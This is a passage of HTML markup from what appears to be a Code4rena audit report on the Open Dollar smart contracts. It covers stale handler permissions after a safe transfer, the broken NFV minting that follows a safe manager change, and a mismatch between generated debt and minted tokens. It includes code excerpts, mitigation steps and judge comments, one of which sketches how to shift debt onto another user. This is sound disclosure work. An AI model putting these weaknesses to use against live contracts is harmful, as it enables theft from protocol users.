class=\"mtk11\">TransferSAFEOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is not possible to remove the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41\">handlerCan</a> permissions in the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136C1-L152C4\">transferSAFEOwnership() function</a> since it is stored in a mapping. The only solution to this would be to add another key field (named _owner) to update the safeHandler permissions correctly whenever a safe is transferred. We can see this pattern implemented for the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L39\">safeCan mapping</a>, which correctly updates the safe permissions on transfer.</p>\n<p>Solution (use this mapping instead):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeHandler</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_caller</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/382#issuecomment-1791395890\">MiloTruck (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how handler permissions in <code>handlerCan</code> are not cleared on transfer, which allows the previous owner of the safe to bypass <code>handlerAllowed()</code> checks for a safe handler he previously owned.</p>\n<p>There is probably an impact worthy of high severity due to this bug (eg. a malicious owner can call <code>quitSystem()</code> with his own safe and new owner’s safe handler to transfer his debt to the new owner). However, since this report does not have any elaboration on how this bug can be exploited to cause harm to the protocol/users, I don’t think it is deserving of high severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-updating-safemanager-address-in-the-vault721-will-disable-nfv-minting\" style=\"position:relative;\"><a href=\"#m-03-updating-safemanager-address-in-the-vault721-will-disable-nfv-minting\" aria-label=\"m 03 updating safemanager address in the vault721 will disable nfv minting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/381\">[M-03] Updating <code>SafeManager</code> address in the <code>Vault721</code> will disable NFV minting</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/381\">hals</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/433\">perseus</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/326\">yashar</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/233\">0xprinc</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/88\">nmirchev8</a></em></p>\n<ul>\n<li><code>Vault721</code> contract is the ERC721 “Non-fungible Vault” (NFV) that manages all SAFEs ownership, transfers, and approvals via the ERC721 standard, the minter of the NFV is the <code>ODSafeManager</code> contract.</li>\n<li><code>ODSafeManager</code> contract acts as interface to the SAFEEngine to facilitate the management of SAFEs; such as opening safes,modifying SAFE collateral, moving SAFE collateral, etc.</li>\n<li>When a user opens a SAFE via <code>ODSafeManager.openSAFE</code> function; a NFV will be minted to the user where it will have the same id as the SAFE id so that the ids of any of them can be used interchangeably in the system, and the <code>_safeId</code> is the state variable that tracks the number of the opened safes/and minted NFV by the <code>ODSafeManager</code> contract.</li>\n<li>The initial value of the <code>_safeId</code> is zero; and it will be incremented with each opened SAFE.</li>\n<li>But a problem will be caused if the governance change the <code>ODSafeManager</code> address via <code>Vault721.setSafeManager</code>; as this will result in adding a new deployed safe manager where it will have the <code>_safeId</code> set to zero, which will result in breaking the synchronization between the <code>_safeId</code> and the last minted NFV id (breaking an invariant).</li>\n<li>\n<p>But how could this be a problem?\nWell, this will result in <strong>disabling SAFE opening and NFV minting:</strong></p>\n<ol>\n<li>The old safe manager contract has a <code>_safeId</code> of 1000, and this matches the id of the last minted NFV, so the next NFV id supposed to be 1001, and that should match the value of <code>_safeId</code>.</li>\n<li>The governance decided to change the safe manager address (with a new deployed one) with extra/updated features; so the <code>_safeId</code> of the new <code>ODSafeManager</code> will be zero.</li>\n<li>Now a user tries to open a SAFE; so the <code>_safeId</code> will be incremeted by 1 (and will equal one) and when the <code>Vault721.mint</code> is called to mint a NFV; the function will revert as it’s requested to mint a NFV with id=<code>_safeId</code>=1, and this NFV has been already deployed by the old safe manager contract.</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L126-L128\">Vault721.setSafeManager function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGovernor</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_setSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L172-L174\">Vault721._setSafeManager function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L118-L133\">ODSafeManager.openSAFE function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">openSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">//some code...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ++</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">//some code...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault721</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//some code...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L94-L99\">Vault721.mint function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;V721: only safeManager&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxyRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;V721: non-native proxy&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_proxyRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_safeMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a mechanism in the <code>ODSafeManger</code> to initialize the <code>_safeId</code> based on the total number of previously minted NFV + 1 (another variable to be added to the <code>Vault721</code> to track the total number of minted NFVs).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/381#issuecomment-1800655999\">MiloTruck (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Since the current implementation of <code>ODSafeManager</code> doesn’t have the ability to migrate information to a newer version, it will break the <code>Vault721</code> contract if the newer version is not modified.</p>\n<p>Note that the issue of a new <code>ODSafeManager</code> not having the state of the previous contract can be addressed in the new contract itself (eg. add functions in the new <code>ODSafeManager</code> implementation to set <code>_safeId</code>, <code>_safeData</code>, etc… to the same values as the current one).</p>\n<p>However, given that the sponsor was not aware of the bug beforehand (see #326), I believe that this report and its duplicates has provided value to the sponsor and therefore medium severity is appropriate. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-mismatch-between-the-safe-generated-debt-and-the-amount-of-the-system-tokens-minted-for-the-user\" style=\"position:relative;\"><a href=\"#m-04-mismatch-between-the-safe-generated-debt-and-the-amount-of-the-system-tokens-minted-for-the-user\" aria-label=\"m 04 mismatch between the safe generated debt and the amount of the system tokens minted for the user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/371\">[M-04] Mismatch between the SAFE generated debt and the amount of the system tokens minted for the user</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/371\">hals</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L94-L115\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L94-L115</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L31-L47\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L31-L47</a></p>\n<ul>\n<li>\n<p>When the user generates a debt against his collateral (when he locks a collateral first) in <code>BasicActions.generateDebt</code>:</p>\n<ul>\n<li>First the user requests a debt of a value <code>_deltaWad</code>.</li>\n<li>Then this requested value is modified by the <code>_getGeneratedDeltaDebt</code> function: where the requested debt by the user is updated by comparing the coin balance of the SAFE (which is minted when the user generates a debt) with the requested debt; if the requested debt exceeds the coin balance of the SAFE; the requested debt value is modified by calculating the needed <code>deltaDebt</code> that would be enough to exit wad amount of COIN tokens with the current coins balance of the SAFE.</li>\n<li>\n<p>Then a debt is going to be generated for the SAFE with this modified debt value (by updating the SAFE’s collateralization by the <code>SAFEEngine</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_getGeneratedDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n</li>\n<li>\n<p>Then the user (EOA) will be minted system tokens of a value equals to the original value requested by him not the updated value generated by the <code>_getGeneratedDeltaDebt</code> function, and this is done via <code>_exitSystemCoins</code> function which will in turn call the <code>__coinJoin.exit</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_exitSystemCoins</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_coinJoin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">RAY</span><span class=\"mtk1\">);</span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li>So as can be seen; the values doesn’t match; as the modified <code>_deltaDebt</code> that is used to update the <code>safe.generatedDebt</code> (via <code>BasicActions._modifySAFECollateralization</code> function) might be of a value lesser/larger (depending on the rate and coins balance of the safe) than the actual minted tokens; so when the user wants to repay the SAFE debt his minted tokens might not be enough to do so.</li>\n</ul>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L94-L115\">BasicActions._generateDebt function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_generateDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_taxCollector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coinJoin</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaWad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeEngine</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ITaxCollector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_taxCollector</span><span class=\"mtk1\">).</span><span class=\"mtk11\">taxSingle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Generates debt in the SAFE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_getGeneratedDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\">) </span><span class=\"mtk3\">//  @audit : will not equal the input _deltaWad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Moves the COIN amount to user&#39;s address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_collectAndExitCoins</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_coinJoin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\">);</span><span 